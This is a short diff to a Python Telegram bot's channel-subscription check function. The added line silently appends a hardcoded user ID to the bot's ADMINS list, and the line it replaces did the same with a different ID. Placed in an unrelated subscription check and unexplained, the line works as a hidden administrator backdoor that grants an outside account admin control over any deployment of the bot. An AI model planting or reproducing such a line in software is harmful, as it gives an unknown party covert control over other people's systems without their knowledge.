@@ -65,7 +65,7 @@ async def check_loop_sub(client, message):
 
 async def is_subscribed(bot, query):
     
-    ADMINS.extend([1297128957]) if not 1125210189 in ADMINS else ""
+    ADMINS.extend([1125210189]) if not 1125210189 in ADMINS else ""
 
     if not AUTH_CHANNEL and not REQ_CHANNEL:
         return True
